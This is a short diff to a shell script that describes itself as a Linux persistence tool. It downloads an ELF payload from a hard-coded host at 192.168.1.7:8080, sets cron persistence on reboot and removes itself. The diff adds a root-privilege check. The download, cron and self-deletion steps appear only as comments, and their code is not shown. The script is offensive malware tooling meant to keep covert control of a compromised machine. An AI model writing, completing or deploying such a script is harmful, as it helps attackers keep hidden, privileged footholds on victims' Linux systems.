@@ -3,10 +3,16 @@
 # calfcrusher@inventati.org
 #
 #
-# A simple persistence script for Linux
+# A simple persistence script for Linux. Run it as root.
 #
 # Download elf payload and set cron persistence on reboot, then remove itself
 #
+
+# Check if script is running as root
+if [ "$EUID" -ne 0 ]
+  then echo "Please run as root"
+  exit
+fi
 
 # Url with payload to download
 URL="https://192.168.1.7:8080/payload.elf"
